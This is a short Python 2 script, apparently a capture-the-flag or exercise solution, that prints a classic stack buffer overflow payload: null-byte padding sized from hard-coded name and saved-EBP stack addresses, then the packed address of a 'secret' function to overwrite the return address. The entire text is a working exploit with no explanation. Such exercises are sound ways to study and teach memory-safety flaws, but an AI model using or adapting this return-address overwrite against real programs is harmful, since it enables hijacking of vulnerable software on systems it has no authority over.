from struct import pack

secret = 0x08048ee0
name = 0xbffff300
ebp = 0xbffff348

print "\x00"*(ebp-name+4) + pack('<I',secret)